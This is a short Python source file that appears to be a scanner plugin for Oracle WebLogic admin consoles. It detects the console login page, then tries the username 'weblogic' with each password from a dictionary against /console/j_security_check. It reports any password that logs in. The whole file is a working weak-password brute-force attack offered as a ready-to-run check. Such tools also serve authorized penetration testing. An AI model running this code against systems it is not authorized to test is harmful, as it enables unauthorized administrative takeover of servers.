# -*- coding:utf-8 -*-

import re
from exp.lib.gla import getpassdict
from exp.lib.httpparse import httpparse

def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)
    print('testing if weblogic-Console')
    http = httpparse()
    passdictarr = getpassdict()
    psw = passdictarr.get_pass_dict()
    try:
        tm = http.httpreq('GET', protocol, ip, port, '/console/login/LoginForm.jsp')
        if b'j_password' in tm[2] and tm[0] == 200:
            for pass_ in psw:
                data = 'j_username=weblogic&j_password=' + pass_ + '&j_character_encoding=UTF-8'
                data = data.encode(encoding="utf-8")
                target_url = url + '/console/j_security_check'
                tm = http.httpreq('POST', protocol, ip, port,  '/console/j_security_check',data=data)
                if re.search(b'console</a>', tm[2],re.I):
                    msg =  'Find'+ 'WebLogic-Console! with pass ' +pass_+ ' in url:' +protocol+'://'+ip+':'+str(port)+'/'
                    print(msg)
                    number = 'v12'
                    return True,url,number,msg
                else:
                    pass
        else:
            msg = 'not WebLogic-Console'
            number = 'v0'
            return False,url,number,msg
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False,url,number,msg
    msg = 'There is no WebLogic-Console weak pass vul'
    number = 'v0'
    return False,url,number,msg